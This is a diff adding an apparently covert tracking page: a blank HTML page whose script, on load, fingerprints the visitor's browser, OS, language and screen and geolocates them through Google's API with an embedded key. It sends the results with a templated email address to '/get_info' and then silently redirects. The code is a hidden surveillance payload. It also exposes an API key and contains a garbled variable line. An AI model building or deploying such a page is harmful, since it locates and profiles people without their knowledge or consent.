@@ -1,0 +1,54 @@
+<!Doctype html>
+<html>
+
+<head>
+<script type="text/javascript" src="/browser.js"></script>
+<script type="text/javascript" src="/getXML.js"></script>
+<script type="text/javascript">
+
+
+var rqst = getXmlHttp();
+
+	function catchfnc() {
+		//alert("catch started-")
+		var s = window.screen;
+		var navbrser = navigator.appName;
+		var lng = navigator.language;
+		var navos = navigator.platform;
+		var brser = BrowserDetect.browser;
+		var ops = BrowserDetect.OS;
+		var height = s.height;
+		var width = s.width;
+		//var colors = s.colorDepth;
+		//var 
+		ttery = navigator.battery || navigator.webkitBattery || navigator.mozBattery || navigator.msBattery;
+		//console.log(battery);
+		//var btr_lvl = Math.floor(battery.level * 100) + "%";
+		//var chrg = battery.charging;
+		rqst.open("POST", "https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyBUpYIrPcbH49dVrsfCPorKGjHa0DjABeA", true);
+		rqst.send();
+		rqst.onreadystatechange = function() {
+			if (rqst.readyState == 4) {
+				var coords = JSON.parse(rqst.responseText);
+				var coords_str = coords.location.lat + "|" + coords.location.lng + "|" + coords.accuracy
+				
+				var addr = "/get_info?browser="+brser+"&language="+lng+"&navbrser="+navbrser+"&navos="+navos+"&OS="+ops+"&h="+height+"&w="+width+"&location_info="+coords_str+"&c=ne_rabotaet" + "&method={{method}}&email={{email}}";
+				rqst.open("GET", addr, true)
+				rqst.send();
+
+				//alert("Catch ok!")
+				
+				window.location = {{whereto}};
+			}
+		}
+
+	}
+
+	catchfnc();
+</script>
+</head>
+
+<body>
+
+</body>
+</html>
